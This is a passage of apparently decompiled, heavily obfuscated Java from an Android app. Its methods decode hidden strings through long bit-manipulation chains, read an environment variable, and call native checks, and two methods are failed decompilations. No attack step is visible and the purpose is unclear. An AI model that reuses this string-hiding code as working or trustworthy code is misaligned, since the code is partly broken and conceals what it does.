                    long j79 = ((j78 >>> 2) | j78) & 252645135;
                    long j80 = ((((j79 >>> 4) | j79) & 16711935) << 8) + j76;
                    long j81 = j69 & 21845;
                    long j82 = ((j81 >>> 1) | j81) & 858993459;
                    long j83 = ((j82 >>> 2) | j82) & 252645135;
                    int i4 = (int) ((((j83 >>> 4) | j83) & 16711935) | j80);
                    long j84 = 1677011159;
                    long j85 = i4;
                    long b4 = c3.b((((((((j84 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j84 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j84 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j84 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j85 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j85 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j85 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j85 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), 6148914691236517205L);
                    long j86 = (b4 >>> 48) & 43690;
                    long j87 = ((j86 >>> 2) | (j86 >>> 1)) & 858993459;
                    long j88 = ((j87 >>> 2) | j87) & 252645135;
                    long j89 = (b4 >>> 32) & 43690;
                    long j90 = ((j89 >>> 2) | (j89 >>> 1)) & 858993459;
                    long j91 = ((j90 >>> 2) | j90) & 252645135;
                    long j92 = ((((j91 >>> 4) | j91) & 16711935) << 16) + ((((j88 >>> 4) | j88) & 16711935) << 24);
                    long j93 = (b4 >>> 16) & 43690;
                    long j94 = ((j93 >>> 2) | (j93 >>> 1)) & 858993459;
                    long j95 = ((j94 >>> 2) | j94) & 252645135;
                    long j96 = b4 & 43690;
                    long j97 = ((j96 >>> 2) | (j96 >>> 1)) & 858993459;
                    long j98 = ((j97 >>> 2) | j97) & 252645135;
                    z(bArr5, new byte[]{56, -68, 114, -63, -99, 54, 111, ((((int) ((((j98 >>> 4) | j98) & 16711935) | (((((j95 >>> 4) | j95) & 16711935) << 8) + j92))) & 18120787) + 1449140224) ^ 1467261039});
                    str = System.getenv(new String(bArr5, StandardCharsets.UTF_8).intern());
                    if (str != null) {
                        c5 = 2863;
                    } else {
                        c4 = 43518;
                        c5 = c4;
                    }
                default:
                    c5 = 2863;
            }
        }
    }

    /*  JADX ERROR: NullPointerException in pass: ConstructorVisitor
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.sameRegAndSVar(jadx.core.dex.instructions.args.InsnArg)" because "resultArg" is null
        	at jadx.core.dex.visitors.MoveInlineVisitor.processMove(MoveInlineVisitor.java:52)
        	at jadx.core.dex.visitors.MoveInlineVisitor.moveInline(MoveInlineVisitor.java:41)
        	at jadx.core.dex.visitors.ConstructorVisitor.visit(ConstructorVisitor.java:35)
        */
    public final boolean b0() {
        /*
            Method dump skipped, instructions count: 5216
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: F0.C0017c0.b0():boolean");
    }

    /* JADX WARN: Removed duplicated region for block: B:10:0x06b9  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x018e  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final boolean c0() {
        /*
            Method dump skipped, instructions count: 1733
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: F0.C0017c0.c0():boolean");
    }

    public final boolean d0() {
        Boolean bool = null;
        char c4 = 4362;
        while (c4 != 26880) {
            if (c4 == 34186) {
                return false;
            }
            if (c4 != 7750) {
                if (c4 != 4362) {
                    c4 = 26880;
                } else {
                    int nextInt = ThreadLocalRandom.current().nextInt();
                    byte b4 = (byte) nextInt;
                    byte b5 = (byte) (nextInt >>> 8);
                    bool = AbstractC0089u1.a(BNatives.f3739a.w(b4, b5), b4, b5, new C0013b0(this, 2));
                    c4 = bool != null ? (char) 7750 : (char) 34186;
                }
            } else if (bool.booleanValue()) {
                c4 = 26880;
            }
        }
        long j2 = -1;
        long j3 = 0;
        long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
        long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
        long j6 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
        long j7 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
        long j8 = ((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j7 | j6 | j5 | j4);
        long j9 = (j8 >>> 48) & 21845;
        long j10 = ((j9 >>> 1) | j9) & 858993459;
        long j11 = ((j10 >>> 2) | j10) & 252645135;
        long j12 = (j8 >>> 32) & 21845;
        long j13 = ((j12 >>> 1) | j12) & 858993459;
        long j14 = ((j13 >>> 2) | j13) & 252645135;
        long j15 = ((((j14 >>> 4) | j14) & 16711935) << 16) + ((((j11 >>> 4) | j11) & 16711935) << 24);
        long j16 = (j8 >>> 16) & 21845;
        long j17 = ((j16 >>> 1) | j16) & 858993459;
        long j18 = ((j17 >>> 2) | j17) & 252645135;
        long j19 = j8 & 21845;
        long j20 = ((j19 >>> 1) | j19) & 858993459;
        long j21 = ((j20 >>> 2) | j20) & 252645135;
        int i = (int) ((((j21 >>> 4) | j21) & 16711935) + ((((j18 >>> 4) | j18) & 16711935) << 8) + j15);
        byte[] bArr = {-35, 5, -32, -31, 102, (((i | 1492727769) - ((150549913 | i) ^ 1342703449)) + 633346048) ^ (-1976049481), 16, -51, -7, 83, -31, -116, -46, 62, -55, Byte.MIN_VALUE, -45, 97, -85, -69, -66, 103};
        byte[] bArr2 = new byte[22];
        bArr2[0] = -53;
        bArr2[1] = 70;
        bArr2[2] = -48;
        bArr2[3] = Byte.MAX_VALUE;
        bArr2[4] = 24;
        bArr2[5] = 87;
        bArr2[6] = 121;
        bArr2[7] = -115;
        bArr2[8] = -49;
        bArr2[9] = 0;
        bArr2[10] = -85;
        bArr2[11] = -52;
        bArr2[12] = -69;
        long j22 = 414701080;
        long j23 = 414701077;
        long j24 = ((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
        long j25 = (j24 >>> 48) & 21845;
        long j26 = ((j25 >>> 1) | j25) & 858993459;
        long j27 = ((j26 >>> 2) | j26) & 252645135;
        long j28 = (j24 >>> 32) & 21845;
        long j29 = ((j28 >>> 1) | j28) & 858993459;
        long j30 = ((j29 >>> 2) | j29) & 252645135;
        long j31 = ((((j30 >>> 4) | j30) & 16711935) << 16) + ((((j27 >>> 4) | j27) & 16711935) << 24);
        long j32 = (j24 >>> 16) & 21845;
        long j33 = ((j32 >>> 1) | j32) & 858993459;
        long j34 = ((j33 >>> 2) | j33) & 252645135;
        long j35 = j24 & 21845;
        long j36 = ((j35 >>> 1) | j35) & 858993459;
        long j37 = ((j36 >>> 2) | j36) & 252645135;
        bArr2[(int) ((((j37 >>> 4) | j37) & 16711935) + (((((j34 >>> 4) | j34) & 16711935) << 8) | j31))] = 43;
        bArr2[14] = -94;
        bArr2[15] = -43;
        long j38 = -968834876;
        long h2 = AbstractC0008a.h(j5, j4, j6, j7);
        long j39 = (((((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j38 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + h2;
        long j40 = (j39 >>> 48) & 43690;
        long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
        long j42 = ((j41 >>> 2) | j41) & 252645135;
        long j43 = (j39 >>> 32) & 43690;
        long j44 = ((j43 >>> 2) | (j43 >>> 1)) & 858993459;
        long j45 = ((j44 >>> 2) | j44) & 252645135;
        long j46 = ((((j45 >>> 4) | j45) & 16711935) << 16) + ((((j42 >>> 4) | j42) & 16711935) << 24);
        long j47 = (j39 >>> 16) & 43690;
        long j48 = ((j47 >>> 2) | (j47 >>> 1)) & 858993459;
        long j49 = ((j48 >>> 2) | j48) & 252645135;
        long j50 = j39 & 43690;
        long j51 = ((j50 >>> 2) | (j50 >>> 1)) & 858993459;
        long j52 = ((j51 >>> 2) | j51) & 252645135;
        int i3 = (int) ((((j52 >>> 4) | j52) & 16711935) + (((((j49 >>> 4) | j49) & 16711935) << 8) | j46));
        long j53 = 71335960;
        long j54 = i3;
        long b6 = c3.b((((((((j53 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j53 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j53 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j53 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j54 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j54 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j54 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j54 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))), 6148914691236517205L);
        long j55 = (b6 >>> 48) & 43690;
        long j56 = ((j55 >>> 2) | (j55 >>> 1)) & 858993459;
        long j57 = ((j56 >>> 2) | j56) & 252645135;
        long j58 = (b6 >>> 32) & 43690;
        long j59 = ((j58 >>> 2) | (j58 >>> 1)) & 858993459;
        long j60 = ((j59 >>> 2) | j59) & 252645135;
        long j61 = ((((j60 >>> 4) | j60) & 16711935) << 16) | ((((j57 >>> 4) | j57) & 16711935) << 24);
        long j62 = (b6 >>> 16) & 43690;
        long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
        long j64 = ((j63 >>> 2) | j63) & 252645135;
        long j65 = b6 & 43690;
        long j66 = ((j65 >>> 2) | (j65 >>> 1)) & 858993459;
        long j67 = ((j66 >>> 2) | j66) & 252645135;
        int i4 = (-1037743930) + ((int) ((((j67 >>> 4) | j67) & 16711935) + (((((j64 >>> 4) | j64) & 16711935) << 8) | j61)));
        bArr2[((i4 & 966407985) * 2) + ((-966407986) - i4)] = -46;
        bArr2[17] = -48;
        bArr2[18] = -38;
        bArr2[19] = -65;
        bArr2[20] = -37;
        bArr2[21] = 3;
        r(bArr, bArr2);
        Charset charset = StandardCharsets.UTF_8;
        String intern = new String(bArr, charset).intern();
        long j68 = 135274528;
        long j69 = (((((((((j68 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j68 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j68 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j68 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + h2 + 6148914691236517205L;
        long j70 = (j69 >>> 48) & 43690;
        long j71 = ((j70 >>> 2) | (j70 >>> 1)) & 858993459;
        long j72 = (j71 | (j71 >>> 2)) & 252645135;
        long j73 = (j69 >>> 32) & 43690;
        long j74 = ((j73 >>> 2) | (j73 >>> 1)) & 858993459;
        long j75 = (j74 | (j74 >>> 2)) & 252645135;
        long j76 = (((j72 | (j72 >>> 4)) & 16711935) << 24) | (((j75 | (j75 >>> 4)) & 16711935) << 16);
        long j77 = (j69 >>> 16) & 43690;
        long j78 = ((j77 >>> 2) | (j77 >>> 1)) & 858993459;
        long j79 = (j78 | (j78 >>> 2)) & 252645135;
        long j80 = j69 & 43690;
        long j81 = ((j80 >>> 2) | (j80 >>> 1)) & 858993459;
        long j82 = (j81 | (j81 >>> 2)) & 252645135;
        byte[] bArr3 = {-102, -67, (-143927783) ^ (8653192 + ((int) (((j82 | (j82 >>> 4)) & 16711935) + ((((j79 | (j79 >>> 4)) & 16711935) << 8) + j76)))), -7};
        r(bArr3, new byte[]{5, -96, -38, -125, -115, -18, 8, -78});
        p(intern, new String(bArr3, charset).intern());
        return true;
    }

    public final boolean e0() {
        Boolean bool = null;
        char c4 = 4009;
        while (c4 != 18670) {
            if (c4 != 4009) {
                if (c4 != 5365) {
                    if (c4 == 53265) {
                        return false;
                    }
                } else if (!bool.booleanValue()) {
                    c4 = 53265;
                }
                c4 = 18670;
            } else {
                int nextInt = ThreadLocalRandom.current().nextInt();
                byte b4 = (byte) nextInt;
                byte b5 = (byte) (nextInt >>> 8);
                bool = AbstractC0089u1.a(BNatives.f3739a.a(b4, b5), b4, b5, new C0013b0(this, 1));
                if (bool != null) {
                    c4 = 5365;
                } else {
                    c4 = 53265;
                }
            }
        }
        byte[] bArr = {-33, 65, 86, -125, -71, -56, Byte.MAX_VALUE, 42, 12, -77};
        v(bArr, new byte[]{-15, 64, -89, -111, 19, -41, -123, -27, 122, -42});
        Charset charset = StandardCharsets.UTF_8;
        String intern = new String(bArr, charset).intern();
        byte[] bArr2 = new byte[4];
        bArr2[0] = -66;
        long j2 = 1265993378;
        long j3 = 1265993379;
        long j4 = ((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
        long j5 = (j4 >>> 48) & 21845;
        long j6 = ((j5 >>> 1) | j5) & 858993459;
        long j7 = ((j6 >>> 2) | j6) & 252645135;
        long j8 = (j4 >>> 32) & 21845;
        long j9 = ((j8 >>> 1) | j8) & 858993459;
        long j10 = ((j9 >>> 2) | j9) & 252645135;
        long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
        long j12 = (j4 >>> 16) & 21845;
        long j13 = ((j12 >>> 1) | j12) & 858993459;
        long j14 = ((j13 >>> 2) | j13) & 252645135;
        long j15 = j4 & 21845;
        long j16 = ((j15 >>> 1) | j15) & 858993459;
        long j17 = ((j16 >>> 2) | j16) & 252645135;
        bArr2[(int) ((((j17 >>> 4) | j17) & 16711935) + (((((j14 >>> 4) | j14) & 16711935) << 8) | j11))] = -92;
        bArr2[2] = -84;
        bArr2[3] = -19;
        long j18 = 1099204464;
        long j19 = -1;
        long j20 = ((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
        long j21 = (j20 >>> 48) & 43690;
        long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
        long j23 = ((j22 >>> 2) | j22) & 252645135;
        long j24 = (j20 >>> 32) & 43690;
        long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
        long j26 = ((j25 >>> 2) | j25) & 252645135;
        long j27 = ((((j23 >>> 4) | j23) & 16711935) << 24) | ((((j26 >>> 4) | j26) & 16711935) << 16);
        long j28 = (j20 >>> 16) & 43690;
        long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
        long j30 = ((j29 >>> 2) | j29) & 252645135;
        long j31 = ((((j30 >>> 4) | j30) & 16711935) << 8) + j27;
        long j32 = j20 & 43690;
        long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
        long j34 = (j33 | (j33 >>> 2)) & 252645135;
        v(bArr2, new byte[]{(((int) (((j34 | (j34 >>> 4)) & 16711935) + j31)) + 402849928) ^ 1502054382, -32, 107, 53, 106, 18, 54, 69});
        t(intern, new String(bArr2, charset).intern());
        return true;
    }

    public final boolean f0() {
        Boolean bool = null;
        char c4 = 6232;
        while (c4 != 1684) {
            if (c4 != 20954) {
                if (c4 != 30351) {
                    if (c4 == 6232) {
                        int nextInt = ThreadLocalRandom.current().nextInt();
                        byte b4 = (byte) nextInt;
                        byte b5 = (byte) (nextInt >>> 8);
                        bool = AbstractC0089u1.a(BNatives.f3739a.m(b4, b5), b4, b5, new C0013b0(this, 0));
                        if (bool != null) {
                            c4 = 30351;
                        }
                    }
                    c4 = 1684;
                } else if (bool.booleanValue()) {
                    c4 = 20954;
                } else {
                    c4 = 1684;
                }
            } else {
                long j2 = -72020245;
                long j3 = -1;
                long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                long j6 = j5 | j4;
                long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                long b6 = c3.b((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j8 + (j7 | j6), 6148914691236517205L);
                long j9 = (b6 >>> 48) & 43690;
                long j10 = ((j9 >>> 2) | (j9 >>> 1)) & 858993459;
                long j11 = ((j10 >>> 2) | j10) & 252645135;
                long j12 = (b6 >>> 32) & 43690;
                long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                long j14 = ((j13 >>> 2) | j13) & 252645135;
                long j15 = ((((j14 >>> 4) | j14) & 16711935) << 16) + ((((j11 >>> 4) | j11) & 16711935) << 24);
                long j16 = (b6 >>> 16) & 43690;
                long j17 = ((j16 >>> 2) | (j16 >>> 1)) & 858993459;
                long j18 = ((j17 >>> 2) | j17) & 252645135;
                long j19 = b6 & 43690;
                long j20 = ((j19 >>> 2) | (j19 >>> 1)) & 858993459;
                long j21 = ((j20 >>> 2) | j20) & 252645135;
                int i = -(((int) ((((j21 >>> 4) | j21) & 16711935) + ((((j18 >>> 4) | j18) & 16711935) << 8) + j15)) & 1073742826);
                long j22 = 268567665;
                long j23 = ((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j8 + (j7 | (j5 + j4));
                long j24 = (j23 >>> 48) & 43690;
                long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
                long j26 = ((j25 >>> 2) | j25) & 252645135;
                long j27 = (j23 >>> 32) & 43690;
                long j28 = ((j27 >>> 2) | (j27 >>> 1)) & 858993459;
                long j29 = ((j28 >>> 2) | j28) & 252645135;
                long j30 = ((((j29 >>> 4) | j29) & 16711935) << 16) | ((((j26 >>> 4) | j26) & 16711935) << 24);
                long j31 = (j23 >>> 16) & 43690;
                long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                long j33 = ((j32 >>> 2) | j32) & 252645135;
                long j34 = j23 & 43690;
                long j35 = ((j34 >>> 2) | (j34 >>> 1)) & 858993459;
                long j36 = ((j35 >>> 2) | j35) & 252645135;
                int i3 = -((int) ((((j36 >>> 4) | j36) & 16711935) + ((((j33 >>> 4) | j33) & 16711935) << 8) + j30));
                byte[] bArr = {-44, 11, 67, V2.a(~i, -292298757, (-292298756) + i) ^ (-1366041530), -23, V2.a(~i3, -209715205, (-209715204) + i3) ^ (-478282786), -109, 57, 18, -6, -94, -56, 110, 55, 40, -13, -63, -61};
                byte[] bArr2 = new byte[18];
                bArr2[0] = -112;
                bArr2[1] = -109;
                bArr2[2] = 12;
                bArr2[3] = -34;
                bArr2[4] = 105;
                bArr2[5] = -16;
                bArr2[6] = -26;
                long j37 = 0;
                long j38 = ((((((((j37 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j37 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j37 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j39 = (((((((j37 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                long j40 = ((j7 + j6) | j8) + (j39 | j38);
                long j41 = (j40 >>> 48) & 21845;
                long j42 = ((j41 >>> 1) | j41) & 858993459;
                long j43 = ((j42 >>> 2) | j42) & 252645135;
                long j44 = (j40 >>> 32) & 21845;
                long j45 = ((j44 >>> 1) | j44) & 858993459;
                long j46 = ((j45 >>> 2) | j45) & 252645135;
                long j47 = ((((j46 >>> 4) | j46) & 16711935) << 16) + ((((j43 >>> 4) | j43) & 16711935) << 24);
                long j48 = (j40 >>> 16) & 21845;
                long j49 = ((j48 >>> 1) | j48) & 858993459;
                long j50 = ((j49 >>> 2) | j49) & 252645135;
                long j51 = j40 & 21845;
                long j52 = ((j51 >>> 1) | j51) & 858993459;
                long j53 = ((j52 >>> 2) | j52) & 252645135;
                bArr2[(((((int) ((((j53 >>> 4) | j53) & 16711935) + (((((j50 >>> 4) | j50) & 16711935) << 8) | j47))) | (-1577827601)) & 1610899761) + 25233410) ^ 1636133172] = -118;
                bArr2[8] = 100;
                bArr2[9] = -50;
                long a2 = AbstractC0088u0.a(j5, j4, j7, j8, j39 + j38);
                long j54 = (a2 >>> 48) & 21845;
                long j55 = (j54 | (j54 >>> 1)) & 858993459;
                long j56 = (j55 | (j55 >>> 2)) & 252645135;
                long j57 = (a2 >>> 32) & 21845;
                long j58 = (j57 | (j57 >>> 1)) & 858993459;
                long j59 = (j58 | (j58 >>> 2)) & 252645135;
                long j60 = (((j59 | (j59 >>> 4)) & 16711935) << 16) + (((j56 | (j56 >>> 4)) & 16711935) << 24);
                long j61 = (a2 >>> 16) & 21845;
                long j62 = (j61 | (j61 >>> 1)) & 858993459;
                long j63 = (j62 | (j62 >>> 2)) & 252645135;
                long j64 = a2 & 21845;
                long j65 = (j64 | (j64 >>> 1)) & 858993459;
                long j66 = (j65 | (j65 >>> 2)) & 252645135;
                bArr2[(((((int) (((j66 | (j66 >>> 4)) & 16711935) | ((((j63 | (j63 >>> 4)) & 16711935) << 8) + j60))) | (-641977474)) & (-1936190071)) + 1344358932) ^ (-591831145)] = -79;
                bArr2[11] = -45;
                bArr2[12] = 9;
                bArr2[13] = -122;
                bArr2[14] = 70;
                bArr2[15] = -77;
                bArr2[16] = -73;
                bArr2[17] = -90;
                y(bArr, bArr2);
                Charset charset = StandardCharsets.UTF_8;
                String intern = new String(bArr, charset).intern();
                byte[] bArr3 = {-33, 109, 65, -123};
                y(bArr3, new byte[]{-108, 79, 30, -7, -41, 72, -54, 26});
                t(intern, new String(bArr3, charset).intern());
                return true;
            }
        }
        return false;
    }
}
